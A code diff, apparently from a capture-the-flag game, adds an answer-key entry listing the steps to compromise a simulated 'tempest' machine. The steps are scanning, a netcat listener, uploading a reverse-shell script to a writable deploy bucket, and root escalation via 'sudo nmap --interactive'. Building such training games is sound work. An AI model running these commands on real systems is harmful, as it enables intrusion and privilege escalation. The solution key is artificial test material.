@@ -124,6 +124,13 @@ const SOLUTIONS = {
       "sudo perl -e 'exec \"/bin/sh\";'", "cat /root/root.txt",
     ],
   },
+  // TEMPEST : bucket de déploiement inscriptible -> RCE. `exit` d'abord pour écouter.
+  tempest: [
+    "exit", "nmap 10.10.11.150", "curl http://10.10.11.150:8080/", "cloudctl ls",
+    "cloudctl get s3://tempest-artifacts/build.log", "nc -lvnp 4444",
+    "cloudctl cp reverse.sh s3://tempest-deploy/", "cat user.txt", "sudo -l",
+    "sudo nmap --interactive", "!sh", "cat /root/root.txt",
+  ],
   axiom: [
     "nmap 10.10.11.244", "curl http://10.10.11.244:8080/", "curl http://10.10.11.244:8080/logs/latest.txt",
     "ssh cibuild@10.10.11.244", { pw: true }, "cat user.txt", "sudo -l", "id", "docker ps",
